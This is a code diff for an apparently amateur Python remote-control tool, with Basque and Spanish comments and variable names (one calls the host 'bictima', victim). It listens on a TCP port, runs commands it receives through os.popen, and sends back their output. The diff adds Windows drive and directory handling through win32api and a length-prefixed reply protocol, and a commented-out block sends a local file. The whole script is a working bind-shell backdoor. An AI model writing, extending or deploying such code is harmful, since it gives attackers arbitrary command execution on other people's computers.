@@ -1,6 +1,9 @@
 import os
 import socket 
-import time
+import sys
+import threading
+import win32api
+
 
 
 
@@ -11,6 +14,12 @@ class server(object):
         print(ip_bictima)
         print(portua)
         print(koneksioak)
+        #scok_Stream(tipo tcp protocolo direcional)
+        #scok_Dgram(tipo udp protocolo undirecional)
+        #tipos de socket
+        #af_inet(ipv4 protrokolo)
+        #af_inet6(ipv6 protokolo)
+        #af_unix(kernel unix )
         self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.so.bind((ip_bictima,portua))
         self.so.listen(koneksioak)
@@ -20,18 +29,17 @@ class server(object):
 
     def koneksioa(self):
       while True:
+          #urla
           url = os.getcwd()
           self.soc.send(bytes(url,encoding = 'utf-8'))
-          byte_tama = os.path.getsize(url)
-          print          
-          .erantzuna = None
+          #comandoa
+          erantzuna = "informazio ezezaguna"
           hartuta = self.soc.recv(1024)
           stri = str(hartuta,encoding='utf-8')
           if stri == "itxi":
               break
           comand = stri.split(" ")
-          print(comand)
-          print("hartuta:", hartuta) 
+          #ruta bideraketa
           if comand[0].lower() == "cd" and len(comand) == 2:
               if comand[1] == "..":
                 url_a = url.split("\\")[:-1]
@@ -40,7 +48,31 @@ class server(object):
                   url += x + "\\"
                   os.chdir(url)
               else:
-                  erantzuna = "comandoa gaizki dago"
+                  ruta_absoluta = False
+                  drives = win32api.GetLogicalDriveStrings()
+                  rutak = drives.split("\000")[:-1]
+                  print(rutak)
+                  ar_ruta = comand[1].split("\\")
+                  for disk in rutak:
+                      print(ar_ruta[0])
+                      print(disk[:-1].lower())
+                      if disk[:-1].lower() == ar_ruta[0]:
+                          ruta_absoluta = True
+                  print(ruta_absoluta)
+                  if ruta_absoluta == True:
+                    try:
+                        os.chdir(comand[1].lower())
+                    except IOError as e:
+                        erantzuna = "comandoa gaizki dago"
+                  if ruta_absoluta == False:
+                      try:
+                        print(url)
+                        ruta_re = url + "\\" + comand[1]
+                        print(ruta_re)
+                        os.chdir(ruta_re.lower())  
+                      except IOError as e: 
+                         erantzuna = "comandoa gaizki dago"
+          #cmd ejekutagarria
           else:
             balioa = os.popen(stri,'r',1).close()
             erantzuna = os.popen(stri,'r',1).read()
@@ -51,8 +83,20 @@ class server(object):
             if balioa == 2:
                 erantzuna = "ez dazkazu baimenik"
             if balioa == None and comand[0].lower() == "mkdir" or stri.lower() == "net user *" :
-                erantzuna = "informazio ezezaguna"
-          self.soc.send(bytes(erantzuna,encoding = 'utf-8'))
+               erantzuna = "informazio ezezaguna"
+          #luzehera
+          erantzuna_byt = bytes(erantzuna,encoding = 'utf-8') 
+          luz = str(sys.getsizeof(erantzuna_byt))
+          print("luze_by:",luz)
+          self.soc.send(bytes(luz,encoding = 'utf-8')) 
+          #datuak cmd 
+          self.soc.sendall(bytes(erantzuna,encoding = 'utf-8'))
+          #time
+          self.soc.recv(1024)
+          #print("time")
+          #e = threading.Event()
+          #e.wait(5)
+          print("time ok")
           #fichategia = open("CURRICULUM.pdf",'rb').read()
           #print(fichategia)
           #self.soc.sendall(fichategia)
@@ -60,7 +104,7 @@ class server(object):
       self.so.close()
       self.soc.close()
 
-ser = server("192.168.0.10",9999,1)
+ser = server("192.168.0.10",9996,1)
 ser.koneksioa()
 
 
